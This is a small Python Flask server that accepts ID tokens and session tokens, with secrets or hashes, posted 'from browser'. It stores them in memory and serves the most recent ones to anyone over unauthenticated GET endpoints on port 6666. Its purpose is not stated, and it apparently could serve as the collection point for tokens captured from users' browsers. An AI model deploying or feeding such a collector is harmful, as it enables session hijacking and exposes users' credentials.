from flask import Flask, request, jsonify

app = Flask(__name__)

id_token_list = []
session_token_list = []

@app.route('/data/id_token', methods=['POST'])
def post_id_token_from_browser():
    data = request.json

    if data.get('id_token') is not None:
        id_token_list.append({"id_token": data.get('id_token')})
    
    return "ok", 200

@app.route('/data/session_token', methods=['POST'])
def post_session_token_from_browser():
    data = request.json

    if data.get('session_token') is not None:
        if data.get('secret') is not None:
            session_token_list.append({"session_token": data.get('session_token'), "secret": data.get('secret')})

        if data.get('hash') is not None:
            session_token_list.append({"session_token": data.get('session_token'), "hash": data.get('hash')})
    
    return "ok", 200

@app.route('/data/id_token', methods=['GET'])
def get_id_token():
    if len(id_token_list) == 0:
        return "no data", 200
    return id_token_list[len(id_token_list)-1], 200

@app.route('/data/session_token', methods=['GET'])
def get_session_token():
    if len(session_token_list) == 0:
        return "no data", 200
    return session_token_list[len(session_token_list)-1], 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=6666, debug=False)